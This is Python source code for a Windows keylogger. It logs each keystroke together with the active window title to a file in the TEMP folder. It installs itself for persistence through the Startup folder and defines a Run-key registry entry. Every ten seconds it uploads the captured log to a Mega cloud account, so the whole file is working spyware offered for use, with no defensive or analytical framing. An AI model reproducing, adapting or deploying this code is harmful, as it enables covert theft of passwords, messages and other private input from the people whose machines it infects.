import os
import time
import threading
from mega import Mega
import winreg as reg
from pynput.keyboard import Key, Listener
import win32gui
from pathlib import Path
import shutil
import getpass
import subprocess
import psutil
from pynput import keyboard
def copy_to_startup(source_file):
    # Get the username of the current user
    username = getpass.getuser()
    
    # Destination path for the Startup folder
    startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    
    # Ensure the Startup folder exists
    if not os.path.exists(startup_folder):
        os.makedirs(startup_folder)
    
    # Destination path for the copied file
    destination_file = os.path.join(startup_folder, os.path.basename(source_file))
    
    try:
        # Copy the file to the Startup folder
        shutil.copy(source_file, destination_file)
        print(f"File copied to Startup folder: {destination_file}")
    except Exception as e:
        print(f"Failed to copy file to Startup folder: {e}")


def Find_File():
    def find_file(file_name):
        # Iterate over all drive letters from A to Z
        for drive_letter in range(ord('A'), ord('Z')+1):
            drive = chr(drive_letter) + ":\\"
            if os.path.exists(drive):
                for root, dirs, files in os.walk(drive):
                    if file_name in files:
                        return os.path.join(root, file_name)
        return None
    file_name_to_find = "NAME_OF_EXECUTABLE.exe"
    found_file_path = find_file(file_name_to_find)
    if found_file_path:
        print(f"File '{file_name_to_find}' found at: {found_file_path}")
    else:
        print(f"File '{file_name_to_find}' not found.")
    return found_file_path
# Function to upload file to Mega
def upload_to_mega(file_path):
    mega = Mega()
    # Login to Mega
    email = 'YOUR_EMAIL'
    password = 'PASSWORD'
    m = mega.login(email, password)

    # Upload the file to Mega
    uploaded_file = m.upload(file_path)

    # Get the link to the uploaded file
    file_link = m.get_upload_link(uploaded_file)
    print(f"File uploaded successfully: {file_link}")

# Function to add the script to startup
def add_to_reg_keys():
    # Specify the name for the startup entry (can be any string)
    name = "MyPythonScript"
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(reg_key, name, 0, reg.REG_SZ, file_path)
        reg.CloseKey(reg_key)
        print(f"Added {file_path} to startup.")
    except Exception as e:
        print(f"Failed to add {file_path} to startup:", e)

def add_to_startup():
    # Specify the path to the Python script
    #file_path = os.path.abspath(__file__)
    file_path = Find_File()
    # Example usage:
    source_file_path = file_path
    copy_to_startup(source_file_path)

# Function to get the active window title
def get_active_window_title():
    return win32gui.GetWindowText(win32gui.GetForegroundWindow())


last_window = None
# Function to log key presses
def on_press(key):
    global last_window
    documents_dir = os.environ.get('TEMP')
    documents_dir += "/keylog.txt"
    try:
        current_window = get_active_window_title().encode('utf-8', 'replace').decode('utf-8')

        # Open the log file in append mode
        with open(documents_dir, "a") as f:
            # Check if the active window has changed
            if current_window != last_window or last_window is None:
                # If changed, write the new window title
                f.write(f"\nActive Window: {current_window}\n")
                last_window = current_window

            # Write the key pressed to the log file
            if hasattr(key, 'char'):
                f.write(key.char)
            elif key == keyboard.Key.space:
                f.write(' ')
            elif key == keyboard.Key.enter:
                f.write('\n')
            else:
                f.write(f' [{key}] ')
    except Exception as e:
        print(f"Error: {e}")

# Function to start the keylogger
def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

# Function to periodically upload the file
def periodic_upload(file_path, interval):
    while True:
        time.sleep(interval)
        upload_to_mega(file_path)


documents_dir = os.environ.get('TEMP')
documents_dir += "/keylog.txt"
# Specify the file path to monitor
file_path = documents_dir

# Add script to startup
add_to_startup()

# Create a thread to run the keylogger
keylogger_thread = threading.Thread(target=start_keylogger)
keylogger_thread.daemon = True
keylogger_thread.start()

# Create a thread to periodically upload the file
upload_thread = threading.Thread(target=periodic_upload, args=(file_path, 10))
upload_thread.daemon = True
upload_thread.start()

# Keep the main thread alive
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("Program terminated.")
